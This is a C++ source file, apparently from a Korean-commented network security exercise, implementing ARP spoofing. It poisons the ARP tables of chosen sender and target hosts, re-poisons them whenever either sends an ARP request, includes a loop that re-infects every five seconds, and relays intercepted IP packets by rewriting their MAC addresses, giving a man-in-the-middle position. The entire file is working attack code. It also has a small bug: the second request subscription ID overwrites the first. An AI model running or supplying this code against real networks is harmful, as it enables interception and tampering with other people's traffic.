/*
 *
 * 대상 목록 관리
 * broadcast인 request잡아서 반응
 * 
*/

#include "arp_spoof.h"

Attack::Attack(uint8_t * interface, uint32_t senderIP, uint32_t targetIP, PcapManager *pcapManager)
{
 
    sendArp = new SendARP(interface, senderIP, targetIP, pcapManager);

}


void ARPSpoof::AddAttackList(uint32_t senderIP, uint32_t targetIP)
{
    Attack * attack = new Attack(interface, senderIP, targetIP, pcapManager);
    attackList.push_back(attack);

}


void ARPSpoof::AttackStart()
{
    list<Attack *>::iterator itor;

    for (itor=attackList.begin(); itor != attackList.end(); itor++)
    {
        SendARP * sa = (*itor)->sendArp;

        sa->InfectARPTable();

        //주기적으로 infect 하는 쓰레드 생성
        //thread maintain (&ARPSpoof::MaintainInfection, this, sa);
        //maintain.detach();

        //relay 반응 등록
        Subscriber * subRelay = new Subscriber( sa->senderMAC, (uint8_t * ) sa->myMAC, 
                                            0, sa->myIP, 
                                            NULL, NULL,
                                            0, 0,
                                            (uint32_t)SUBTYPE::RELAYIP, 
                                            (void *)this, 
                                            ETHERTYPE_IP,
                                            (void *)&ARPSpoof::RelayIPPacket
                                            );
        pcapManager->AddSubscriber(subRelay);
        (*itor)->relaySubId = subRelay->GetSubID();

        //request 반응 등록 1 
        // sender가 물어볼 때
        Subscriber * subRequest1 = new Subscriber( sa->senderMAC, NULL, 
                                            0, 0, 
                                            sa->senderMAC, NULL,
                                            sa->senderIP, sa->targetIP,
                                            (uint32_t)SUBTYPE::REACTSENDERREQUEST, 
                                            (void *)this, 
                                            ETHERTYPE_ARP,
                                            (void *)&ARPSpoof::ReactRequest
                                            );
        
        pcapManager->AddSubscriber(subRequest1);
        (*itor)->requestSubId1 = subRequest1->GetSubID();

        //request 반응 등록 2
        // target이 물어볼 때
        Subscriber * subRequest2 = new Subscriber( sa->targetMAC, NULL, 
                                                0, 0, 
                                                sa->targetMAC, NULL,
                                                sa->targetIP, 0,
                                                (uint32_t)SUBTYPE::REACTTARGETREQUEST, 
                                                (void *)this, 
                                                ETHERTYPE_ARP,
                                                (void *)&ARPSpoof::ReactRequest
                                                );
        
        pcapManager->AddSubscriber(subRequest2);
        (*itor)->requestSubId1 = subRequest2->GetSubID();

    }
}

void ARPSpoof::ReactRequest(uint32_t subID)
{
    //infect again
    list<Attack *>::iterator itor;
    for (itor=attackList.begin(); itor != attackList.end(); itor++)
    {
        if( (*itor)->requestSubId2  == subID || (*itor)->requestSubId1  == subID)
        {
            printf("re infection\n");
            (*itor)->sendArp->InfectARPTable();
            break;
        }
        
    }


}

void ARPSpoof::MaintainInfection(SendARP * sendARP)
{
    while(true)
    {
        this_thread::sleep_for(5s);
        sendARP->InfectARPTable();
    }
    
}

//target mac을 변경하여 전송
//sender -> attacker -> target
void ARPSpoof::RelayIPPacket(const uint8_t * buf, uint32_t len, uint32_t subID)
{
    uint8_t * modifiedPacket;
    modifiedPacket = (uint8_t *)malloc(len);

    memcpy(modifiedPacket, buf, len);
    
    //패킷 수정
    struct ether_header * eth = (struct ether_header * )modifiedPacket;

    list<Attack *>::iterator itor;
    for (itor=attackList.begin(); itor != attackList.end(); itor++)
    {
        if( (*itor)->relaySubId  == subID)
        {
            //이더넷 헤더를 target MAC으로 변환
            printf("send modified...\n");

            memcpy( (eth->ether_shost), (*itor)->sendArp->myMAC, ETH_ALEN);
            memcpy( (eth->ether_dhost), (*itor)->sendArp->targetMAC, ETH_ALEN);


            pcapManager->Send(modifiedPacket, len);
            break;
        }
    }


    free(modifiedPacket);

}




ARPSpoof::ARPSpoof(uint8_t * inter, uint32_t num)
{
    attackNum = num;
    interface = inter;
    pcapManager = new PcapManager(interface);

    //while(1);
}

